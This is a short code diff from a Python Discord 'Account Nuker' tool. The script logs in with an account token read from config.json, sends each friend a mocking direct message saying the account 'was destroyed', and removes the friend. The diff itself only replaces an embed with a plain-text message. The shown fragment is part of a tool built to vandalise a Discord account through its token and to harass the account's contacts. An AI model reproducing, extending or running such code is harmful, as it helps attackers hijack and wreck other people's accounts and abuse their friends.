@@ -15,14 +15,12 @@ with open("config.json", "r", encoding="utf-8") as f:
 	config = json.load(f)
 token=config['TOKEN']
 
-embed=discord.Embed(title="", url="https://github.com/", description="Account Was Destroyed Using Account Nuker By LALOL", color=0xff0000)
-embed.set_author(name="Account Nuker By LALOL", url="https://github.com/Its-LALOL/Discord-Account-Nuker")
 jfj=0
 gaif=0
 RemovedFriends=0
 
 async def RemoveFriend(user, Friends):
-	await user.dm_channel.send(f"||{user.mention}||", embed=embed)
+	await user.dm_channel.send(f"||{user.mention}|| This account was destroyed using the LALOL Account Nuker :clown:\nhttps://github.com/Its-LALOL/Discord-Account-Nuker")
 	await user.remove_friend()
 	print(Fore.GREEN + f"Removed {user.name}")
 	global RemovedFriends
